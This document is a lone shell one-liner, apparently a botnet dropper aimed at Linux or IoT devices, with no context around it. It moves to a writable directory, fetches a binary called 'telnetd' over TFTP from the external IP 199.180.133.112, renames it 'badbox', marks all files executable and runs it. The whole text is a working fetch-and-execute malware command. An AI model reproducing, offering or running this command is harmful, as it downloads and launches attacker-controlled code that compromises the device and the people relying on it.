cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 199.180.133.112;cat telnetd >badbox;chmod +x *;./badbox
